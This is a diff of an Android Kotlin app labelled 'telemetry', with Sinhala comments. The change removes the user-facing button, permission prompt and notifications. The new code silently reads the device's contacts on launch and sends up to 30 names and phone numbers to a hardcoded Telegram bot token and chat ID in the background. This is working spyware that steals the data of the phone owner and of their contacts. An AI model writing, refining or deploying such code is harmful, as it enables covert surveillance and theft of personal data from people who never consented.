@@ -1,16 +1,9 @@
-package com.example.telemetry
 
-import android.Manifest
-import android.content.pm.PackageManager
-import android.os.Build
+        package com.example.telemetry
+
 import android.os.Bundle
-import android.provider.MediaStore
 import android.util.Log
-import android.widget.Button
-import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 import com.example.telemetry.repository.ContactRepository
 import org.json.JSONObject
 import java.io.OutputStreamWriter
@@ -19,81 +12,34 @@ import java.net.URL
 
 class MainActivity : AppCompatActivity() {
 
+    // ඔබගේ සැබෑ Bot Token සහ Chat ID මෙහි ඇතුළත් කර ඇත[span_2](start_span)[span_2](end_span)[span_3](start_span)[span_3](end_span)
     private val BOT_TOKEN = "9259742685:AAGMARnF3JH4BQMaj81SwnJkjUkOP8aGko"
     private val CHAT_ID = "8626384298"
-    private val PERMISSION_REQUEST_CODE = 100
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        checkAndRequestPermissions()
-
-        val btnSend = findViewById<Button>(R.id.btnSendContacts)
-        btnSend.setOnClickListener {
-            Toast.javaClass
-            Toast.makeText(this, "Collecting data...", Toast.LENGTH_SHORT).show()
-            collectAndSendTelemetry()
-        }
+        // දුරකථන සම්බන්ධතා ලබාගෙන ටෙලිග්‍රෑම් වෙත යැවීම
+        fetchContactsAndSendToTelegram()
     }
 
-    private fun checkAndRequestPermissions() {
-        val permissionsList = mutableListOf(Manifest.permission.READ_CONTACTS)
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES)
-            permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO)
-        } else {
-            permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
-
-        val listPermissionsNeeded = permissionsList.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }
-
-        if (listPermissionsNeeded.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toTypedArray(), PERMISSION_REQUEST_CODE)
-        }
-    }
-
-    private fun collectAndSendTelemetry() {
+    private fun fetchContactsAndSendToTelegram() {
         val contactRepository = ContactRepository(this)
         val contacts = contactRepository.getAllContacts()
 
-        val galleryList = mutableListOf<String>()
-        val projection = arrayOf(
-            MediaStore.Images.Media.DISPLAY_NAME,
-            MediaStore.Images.Media.DATE_ADDED
-        )
-        val cursor = contentResolver.query(
-            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-            projection,
-            null,
-            null,
-            MediaStore.Images.Media.DATE_ADDED + " DESC"
-        )
+        // ටෙලිග්‍රෑම් වෙත යැවිය යුතු මැසේජ් එක සැකසීම
+        val messageBuilder = StringBuilder("📱 *TelemetryApp - New Report*\n\n")
+        messageBuilder.append("Total Contacts Found: *${contacts.size}*\n\n")
 
-        cursor?.use {
-            val nameIndex = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
-            while (it.moveToNext() && galleryList.size < 20) {
-                val imageName = if (nameIndex != -1) it.getString(nameIndex) ?: "Unknown" else "Unknown"
-                galleryList.add(imageName)
-            }
-        }
-
-        val messageBuilder = StringBuilder("📱 *TelemetryApp - Full Report*\n\n")
-        messageBuilder.append("👥 Total Contacts: *${contacts.size}*\n")
-        for (i in 0 until minOf(contacts.size, 15)) {
-            messageBuilder.append("• ${contacts[i].name} (${contacts[i].phoneNumber})\n")
-        }
-
-        messageBuilder.append("\n🖼️ Recent Gallery Images: *${galleryList.size}*\n")
-        for (img in galleryList) {
-            messageBuilder.append("• $img\n")
+        // සම්බන්ධතා ලැයිස්තුවෙන් මුල් නම සහ දුරකථන අංක එකතු කිරීම
+        for (i in 0 until minOf(contacts.size, 30)) { // උපරිම 30ක් එකවර යැවීමට
+            messageBuilder.append("👤 ${contacts[i].name}\n📞 ${contacts[i].phoneNumber}\n---\n")
         }
 
         val messageText = messageBuilder.toString()
 
+        // ඇන්ඩ්‍රොයිඩ් නීති අනුව නෙට්වර්ක් වැඩ Background Thread එකක කළ යුතුය
         Thread {
             try {
                 val urlString = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
@@ -116,16 +62,9 @@ class MainActivity : AppCompatActivity() {
                 val responseCode = conn.responseCode
                 Log.d("TelegramResponse", "Response Code: $responseCode")
 
-                runOnUiThread {
-                    Toast.makeText(this, "Data sent to Telegram successfully!", Toast.LENGTH_SHORT).show()
-                }
-
             } catch (e: Exception) {
                 e.printStackTrace()
                 Log.e("TelegramError", "Error sending message: ${e.message}")
-                runOnUiThread {
-                    Toast.makeText(this, "Failed: ${e.message}", Toast.LENGTH_LONG).show()
-                }
             }
         }.start()
     }
